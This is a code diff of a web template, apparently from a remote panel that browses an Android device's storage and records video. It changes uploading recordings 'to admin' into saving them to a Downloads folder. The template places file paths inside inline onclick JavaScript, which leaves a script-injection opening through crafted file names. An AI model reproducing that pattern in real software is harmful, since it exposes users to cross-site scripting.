@@ -1,39 +1,43 @@
-<div class="ui segment">
-    <div class="ui secondary menu">
-        <div class="right menu">
-            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> 
-                <i class="icon home"></i>Home
-            </button>
+<div class="twelve wide column">
+            <div class="ui segment">
+                <div class="ui secondary menu">
+                    <div class="right menu">
+                        <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> 
+                            <i class="icon home"></i>Home
+                        </button>
+                    </div>
+                </div>
+                <table class="ui celled table">
+                    <thead>
+                        <tr>
+                            <th style="text-align: center" colspan="2">Files</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <% pageData.forEach((item) => { %>
+                        <tr>
+                            <td title="<%= item.path %>"><%= item.name %></td>
+                            <td class="collapsing">
+                                <% if(!item.isDir) { %>
+                                <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">
+                                    <i class="icon download blue"></i>
+                                </button>
+                                <% } else { %>
+                                <button class="ui button dlop" onclick="openDirectory(this, '<%= item.path %>')">
+                                    <i class="icon folder open grey"></i>
+                                </button>
+                                <% } %>
+                            </td>
+                        </tr>
+                        <% }) %>
+                    </tbody>
+                </table>
+
+                <button id="startRecording" class="ui green button">Start Recording</button>
+                <button id="stopRecording" class="ui red button" disabled>Stop Recording</button>
+            </div>
         </div>
     </div>
-    <table class="ui celled table">
-        <thead>
-            <tr>
-                <th style="text-align: center" colspan="2">Files</th>
-            </tr>
-        </thead>
-        <tbody>
-            <% pageData.forEach((item) => { %>
-            <tr>
-                <td title="<%= item.path %>"><%= item.name %></td>
-                <td class="collapsing">
-                    <% if(!item.isDir) { %>
-                    <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">
-                        &nbsp;&nbsp;&nbsp;<i class="icon download blue"></i>
-                    </button>
-                    <% } else { %>
-                    <button class="ui button dlop" onclick="openDirectory(this, '<%= item.path %>')">
-                        &nbsp;&nbsp;&nbsp;<i class="icon folder open grey"></i>
-                    </button>
-                    <% } %>
-                </td>
-            </tr>
-            <% }) %>
-        </tbody>
-    </table>
-
-    <button id="startRecording" class="ui green button">Start Recording</button>
-    <button id="stopRecording" class="ui red button" disabled>Stop Recording</button>
 
     <script>
         let mediaRecorder;
@@ -51,7 +55,7 @@
 
             mediaRecorder.onstop = function() {
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                sendVideoToAdmin(blob);
+                saveVideoToDownloads(blob); // حفظ الفيديو في مجلد التحميلات
                 recordedChunks = [];
             };
 
@@ -66,22 +70,23 @@
             document.getElementById('stopRecording').disabled = true;
         }
 
-        function sendVideoToAdmin(blob) {
+        function saveVideoToDownloads(blob) {
             const formData = new FormData();
             formData.append('video', blob, 'recorded_video.webm');
 
-            fetch('/upload-video', {
+            fetch('/save-video', {
                 method: 'POST',
                 body: formData
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Video uploaded successfully:', data);
-                showNotification('#2ecc71', 'Video sent to admin successfully');
+                console.log('Video saved successfully:', data);
+                showNotification('#2ecc71', 'Video saved to Downloads');
+                location.reload(); // تحديث الصفحة لعرض الفيديو الجديد
             })
             .catch(error => {
-                console.error('Error uploading video:', error);
-                showNotification('#f03434', 'Error sending video to admin');
+                console.error('Error saving video:', error);
+                showNotification('#f03434', 'Error saving video');
             });
         }
 
@@ -144,5 +149,23 @@
                 }
             })
         }
+
+        function showNotification(color, message) {
+            // دالة لعرض الإشعارات
+            const notification = document.createElement('div');
+            notification.style.position = 'fixed';
+            notification.style.bottom = '20px';
+            notification.style.right = '20px';
+            notification.style.backgroundColor = color;
+            notification.style.color = 'white';
+            notification.style.padding = '10px';
+            notification.style.borderRadius = '5px';
+            notification.innerText = message;
+            document.body.appendChild(notification);
+            setTimeout(() => {
+                notification.remove();
+            }, 3000);
+        }
     </script>
-</div>
+</body>
+</html>
